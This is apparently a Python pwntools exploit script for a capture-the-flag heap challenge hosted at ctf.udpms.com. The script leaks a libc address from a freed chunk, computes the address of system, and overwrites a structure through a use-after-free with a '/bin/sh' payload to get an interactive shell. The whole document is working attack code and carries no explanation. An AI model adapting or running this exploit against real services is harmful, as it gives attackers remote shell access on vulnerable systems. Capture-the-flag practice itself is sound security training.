from pwn import *

s = remote('ctf.udpms.com', 8585)
def add_info(name,age,comment):
	s.recvuntil('>')
	s.sendline('1')
	s.recvuntil(':')
	s.send(name)
	s.recvuntil(':')
	s.sendline(str(age))
	s.recvuntil(':')
	s.sendline(comment)
def del_info(index):
	s.recvuntil('>')
	s.sendline('2')
	s.recvuntil(':')
	s.sendline(str(index))
def add_memo(size,dat):
	s.recvuntil('>')
	s.sendline('4')
	s.recvuntil(':')
	s.sendline(str(size))
	s.recvuntil(':')
	s.sendline(dat)
def del_memo(index):
	s.recvuntil('>')
	s.sendline('5')
	s.recvuntil(':')
	s.sendline(str(index))

add_info("AAA",123,"AAAA")
add_memo(0x400,"1234")
add_memo(0x400,"1234")
del_memo(0)
s.recvuntil('>')
s.sendline('6')
s.recvuntil(':')
s.sendline('0')
libc = u64(s.recvuntil('\x7f')[-6:]+'\x00\x00') - 0x3c4b78
system = libc+ 0x45390
log.info('LIBC : 0x%x'%libc)
del_info(0)
dat = "/bin/sh"
dat += '\x00'*(24-len(dat))
dat += p64(system)
add_memo(0x88,dat)
s.interactive()
